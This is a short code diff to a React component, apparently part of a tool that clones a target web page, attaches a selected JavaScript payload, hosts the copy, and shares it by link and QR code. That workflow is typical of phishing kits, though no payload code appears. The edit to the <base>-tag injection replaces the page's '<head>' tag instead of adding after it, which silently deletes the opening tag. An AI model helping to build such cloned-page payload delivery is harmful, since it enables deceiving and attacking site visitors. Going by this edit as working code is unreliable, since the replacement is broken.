@@ -14,9 +14,9 @@ import { Loader2, Wand, Share2, Clipboard, Globe } from 'lucide-react';
 import { clonePageFromUrl } from '@/ai/flows/clone-page-from-url-flow';
 import { useAuth } from '@/hooks/use-auth';
 import { logActivity } from '@/services/activity-log-service';
-import { QrCodeGenerator } from './qr-code-generator';
 import type { JsPayload } from '@/types';
 import { hostPageOnServer } from '@/actions/host-page-action';
+import { QrCodeGenerator } from './qr-code-generator';
 
 const formSchema = z.object({
   targetUrl: z.string().url({ message: 'Please enter a valid URL.' }),
@@ -69,7 +69,7 @@ export function AdvancedPageCloner({ selectedPayload, onLinkGenerated }: Advance
       
       // Inject <base> tag to fix relative links
       if (html.includes('<head>')) {
-        html = html.replace(/<head>/i, `<head>\\n<base href="${values.targetUrl}">`);
+        html = html.replace(/<head>/i, `\\n<base href="${values.targetUrl}">`);
       } else {
         html = `<head><base href="${values.targetUrl}"></head>${html}`;
       }
